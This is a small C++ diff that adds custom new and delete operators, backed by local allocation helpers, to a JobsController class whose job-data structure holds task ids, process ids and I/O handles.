@@ -1,6 +1,15 @@
 #include "JobsController.h"
 #include "ApiLoader.h"
 
+void* JobsController::operator new(size_t sz) {
+	void* p = MemAllocLocal(sz);
+	return p;
+}
+
+void JobsController::operator delete(void* p) noexcept {
+	MemFreeLocal(&p, sizeof(JobsController));
+}
+
 JobData JobsController::CreateJobData(ULONG taskId, WORD Type, WORD State, HANDLE object, WORD pid, HANDLE input, HANDLE output)
 {
     JobData jobData = { taskId, Type, State, object, pid, input, output };
